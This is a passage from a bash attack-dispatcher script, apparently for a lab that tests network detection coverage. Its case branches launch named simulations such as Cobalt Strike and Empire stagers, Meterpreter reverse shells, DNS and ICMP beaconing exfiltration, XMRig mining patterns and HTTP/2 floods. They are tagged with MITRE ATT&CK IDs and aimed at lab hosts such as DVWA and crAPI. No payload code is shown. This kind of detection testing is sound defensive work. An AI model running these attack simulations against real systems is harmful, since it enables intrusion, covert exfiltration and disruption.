        run_script_attack "gap_attacks.sh" "cobalt_strike_stager" "c2" "T1105" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_meterpreter_https)
        run_script_attack "gap_attacks.sh" "meterpreter_https" "c2" "T1071.001" "custom" "$METASPLOIT_IP" "443" "https" "$NOTES"
        ;;
    gap_meterpreter_tcp)
        run_script_attack "gap_attacks.sh" "meterpreter_reverse_tcp" "c2" "T1095" "custom" "$METASPLOIT_IP" "4444" "tcp" "$NOTES"
        ;;
    gap_empire_stager)
        run_script_attack "gap_attacks.sh" "empire_stager" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_mythic_c2)
        run_script_attack "gap_attacks.sh" "mythic_c2_http" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_havoc_demon)
        run_script_attack "gap_attacks.sh" "havoc_demon" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Gap Attacks — Encrypted/Protocol
    # =========================================================================
    gap_tls_nonstandard)
        run_script_attack "gap_attacks.sh" "tls_nonstandard_ports" "evasion" "T1573" "openssl" "$WINDOWS_IP" "443" "tls" "$NOTES"
        ;;
    gap_tls_anomalies)
        run_script_attack "gap_attacks.sh" "tls_cert_anomalies" "evasion" "T1573" "openssl" "$WINDOWS_IP" "443" "tls" "$NOTES"
        ;;
    gap_tls_jitter)
        run_script_attack "gap_attacks.sh" "tls_beaconing_jitter" "c2" "T1573" "custom" "$DVWA_IP" "443" "tls" "$NOTES"
        ;;
    gap_http2_flood)
        run_script_attack "gap_attacks.sh" "http2_flood" "evasion" "T1498" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_websocket_abuse)
        run_script_attack "gap_attacks.sh" "websocket_abuse" "web" "T1190" "custom" "$CRAPI_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Gap Attacks — Cryptomining
    # =========================================================================
    gap_stratum_mining)
        run_script_attack "gap_attacks.sh" "stratum_mining" "c2" "T1496" "custom" "$DVWA_IP" "3333" "stratum" "$NOTES"
        ;;
    gap_xmrig_pattern)
        run_script_attack "gap_attacks.sh" "xmrig_pattern" "c2" "T1496" "custom" "$DVWA_IP" "3333" "stratum" "$NOTES"
        ;;
    gap_coinhive_pattern)
        run_script_attack "gap_attacks.sh" "coinhive_pattern" "c2" "T1496" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Gap Attacks — Beaconing
    # =========================================================================
    gap_beacon_base64)
        run_script_attack "gap_attacks.sh" "beacon_base64_exfil" "exfiltration" "T1132.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_beacon_dns_txt)
        run_script_attack "gap_attacks.sh" "beacon_dns_txt" "c2" "T1071.004" "custom" "$AD_DC_IP" "53" "dns" "$NOTES"
        ;;
    gap_beacon_icmp)
        run_script_attack "gap_attacks.sh" "beacon_icmp_covert" "exfiltration" "T1095" "custom" "$DVWA_IP" "*" "icmp" "$NOTES"
        ;;
    gap_beacon_headers)
        run_script_attack "gap_attacks.sh" "beacon_header_covert" "c2" "T1071.001" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    # =========================================================================
    # Gap Attacks — Anomalous Traffic
    # =========================================================================
    gap_large_posts)
        run_script_attack "gap_attacks.sh" "large_post_requests" "exfiltration" "T1048.003" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_high_frequency)
        run_script_attack "gap_attacks.sh" "high_frequency_requests" "evasion" "T1498" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_ua_anomalies)
        run_script_attack "gap_attacks.sh" "user_agent_anomalies" "recon" "T1592" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_exe_downloads)
        run_script_attack "gap_attacks.sh" "exe_download_pattern" "c2" "T1105" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;
    gap_staged_download)
        run_script_attack "gap_attacks.sh" "staged_download" "c2" "T1105" "custom" "$DVWA_IP" "80" "http" "$NOTES"
        ;;

    "")
        print_help
        ;;

    *)
        echo -e "${RED}Unknown attack type: $ATTACK_TYPE${NC}"
        echo "Use --list to see available attacks"
        exit 1
        ;;
esac
